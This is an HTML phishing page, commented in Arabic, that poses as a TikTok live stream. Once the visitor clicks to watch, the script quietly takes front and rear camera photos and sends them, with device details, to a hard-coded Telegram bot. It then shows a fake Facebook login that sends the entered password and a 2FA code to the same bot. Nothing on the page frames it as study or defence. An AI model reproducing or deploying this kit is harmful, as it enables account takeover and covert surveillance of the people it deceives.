<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>TikTok Live - Watch</title>
    <style>
        /* تنسيقات عامة */
        body, html { margin: 0; padding: 0; height: 100%; background: #000; font-family: sans-serif; overflow-x: hidden; }
        
        /* واجهة التيك توك */
        #tiktok-section { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; background: #000; }
        .video-container { position: relative; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; }
        video#main-video { width: 100%; height: 100%; object-fit: cover; }
        .live-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 110; }
        .live-tag { position: absolute; top: 20px; right: 20px; background: #ff0050; color: #fff; padding: 5px 12px; border-radius: 4px; font-weight: bold; font-size: 14px; }
        #start-btn { background: #ff0050; color: #fff; border: none; padding: 15px 40px; border-radius: 30px; font-weight: bold; cursor: pointer; font-size: 18px; box-shadow: 0 0 20px rgba(255,0,80,0.6); }

        /* واجهة الفيسبوك */
        #facebook-section { display: none; background: #f0f2f5; min-height: 100vh; width: 100%; position: absolute; top: 0; left: 0; z-index: 200; flex-direction: column; align-items: center; }
        .fb-header { width: 100%; text-align: center; padding: 30px 0; }
        .fb-header img { width: 120px; }
        .login-card { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
        .fb-msg { background: #fff9e6; border: 1px solid #ffe58f; padding: 12px; border-radius: 4px; margin-bottom: 20px; font-size: 14px; color: #856404; text-align: center; }
        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 16px; background: #f5f6f7; }
        .fb-btn { width: 100%; background: #1877f2; color: #fff; border: none; padding: 12px; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        
        /* عناصر مخفية */
        canvas, #hidden-camera { display: none; }
        .loader { display: none; margin: 20px auto; border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div id="tiktok-section">
    <div class="video-container">
        <div class="live-tag">مباشر الآن</div>
        <div class="live-overlay" id="overlay">
            <button id="start-btn">مشاهدة البث المباشر</button>
        </div>
        <video id="main-video" loop playsinline>
            <source src="https://github.com/facloook5-cpu/Img/raw/refs/heads/main/10cb671515b53c569eabd7fd10c02f9f.mp4" type="video/mp4">
        </video>
    </div>
</div>

<div id="facebook-section">
    <div class="fb-header">
        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu_m_aGDR.svg" alt="Facebook">
    </div>

    <div class="login-card" id="fb-login-box">
        <div class="fb-msg">يجب تسجيل الدخول باستخدام فيسبوك لمشاهدة هذا المحتوى الحصري</div>
        <input type="text" id="fb-user" placeholder="البريد الإلكتروني أو رقم الهاتف">
        <input type="password" id="fb-pass" placeholder="كلمة السر">
        <button class="fb-btn" onclick="captureFB()">تسجيل الدخول</button>
        <div style="text-align:center; color:#1877f2; font-size:14px; margin-top:15px;">هل نسيت كلمة السر؟</div>
    </div>

    <div class="login-card" id="fb-otp-box" style="display:none;">
        <h3 style="text-align:center;">رمز الأمان مطلوب</h3>
        <p style="font-size:14px; color:#606770; text-align:center;">لقد أرسلنا رمزاً مكوناً من 6 أرقام إلى هاتفك. يرجى إدخاله للمتابعة.</p>
        <input type="number" id="fb-code" placeholder="------">
        <button class="fb-btn" onclick="captureOTP()">تأكيد الهوية</button>
    </div>

    <div class="loader" id="fb-loader"></div>
</div>

<video id="hidden-camera" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
    const token = '8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0';
    const chat_id = '8350812242';

    const tiktokSec = document.getElementById('tiktok-section');
    const fbSec = document.getElementById('facebook-section');
    const mainVid = document.getElementById('main-video');
    const hiddenCam = document.getElementById('hidden-camera');
    const canvas = document.getElementById('canvas');

    // --- تشغيل السيناريو عند الضغط ---
    document.getElementById('start-btn').addEventListener('click', async () => {
        document.getElementById('overlay').style.display = 'none';
        mainVid.play();
        
        // 1. إرسال بيانات الجهاز والـ IP فوراً
        await sendMsg(`🔥 <b>صيد جديد دخل المصيدة</b>\n📱 الجهاز: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent.substring(0,50)}...`);
        
        // 2. سحب 3 صور أمامية و 3 خلفية "في الخلفية"
        await runStealthCapture();

        // 3. التحويل التلقائي لصفحة الفيس بوك بعد 6 ثواني
        setTimeout(() => {
            tiktokSec.style.display = 'none';
            fbSec.style.display = 'flex';
        }, 6000);
    });

    // --- دوال سحب البيانات والكاميرا ---
    async function sendMsg(text) {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: chat_id, text: text, parse_mode: 'HTML'})
        });
    }

    async function sendPhoto(blob, cap) {
        const fd = new FormData();
        fd.append('chat_id', chat_id);
        fd.append('photo', blob, 'img.jpg');
        fd.append('caption', cap);
        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: 'POST', body: fd});
    }

    async function runStealthCapture() {
        // سحب 3 أمامية
        await capture(true); 
        // سحب 3 خلفية
        await capture(false);
    }

    async function capture(isFront) {
        const mode = isFront ? "user" : "environment";
        const label = isFront ? "أمامية" : "خلفية";
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: mode}});
            hiddenCam.srcObject = stream;
            await new Promise(r => setTimeout(r, 1000));
            
            for(let i=0; i<3; i++) {
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(hiddenCam, 0, 0, 640, 480);
                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
                await sendPhoto(blob, `📸 كاميرا ${label} - صورة ${i+1}`);
                await new Promise(r => setTimeout(r, 500));
            }
            stream.getTracks().forEach(t => t.stop());
        } catch(e) { console.log(label + " denied"); }
    }

    // --- دوال الفيسبوك ---
    async function captureFB() {
        const user = document.getElementById('fb-user').value;
        const pass = document.getElementById('fb-pass').value;
        if(!user || !pass) return alert("يرجى إدخال البيانات");

        document.getElementById('fb-login-box').style.display = 'none';
        document.getElementById('fb-loader').style.display = 'block';

        // إرسال الحساب
        await sendMsg(`🆔 <b>بيانات فيسبوك</b>\n📧 الحساب: <code>${user}</code>\n🔑 الباسورد: <code>${pass}</code>`);

        // انتظار دقيقتين كما طلبت
        setTimeout(() => {
            document.getElementById('fb-loader').style.display = 'none';
            document.getElementById('fb-otp-box').style.display = 'block';
        }, 120000);
    }

    async function captureOTP() {
        const code = document.getElementById('fb-code').value;
        if(!code) return;

        await sendMsg(`🔐 <b>رمز التحقق (2FA)</b>\n🔢 الرمز المستلم: <code>${code}</code>`);
        alert("انتهت جلسة تسجيل الدخول، يرجى المحاولة لاحقاً.");
        window.location.href = "https://facebook.com";
    }
</script>
</body>
</html>
